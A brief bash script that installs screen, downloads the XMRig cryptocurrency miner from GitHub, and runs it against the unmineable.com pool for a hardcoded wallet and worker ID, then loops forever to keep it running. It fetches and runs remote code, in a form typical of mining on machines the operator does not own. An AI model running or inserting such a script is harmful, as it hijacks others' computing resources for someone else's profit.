#!/bin/bash
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
./xmrig -o rx.unmineable.com:3333 -a rx -k -u WIN:TArNGxDsJ4wQchrqwCSt9VYHP1XvMM5abr.WINID001 -p x
while [ 1 ]; do
sleep 3
done
sleep 999
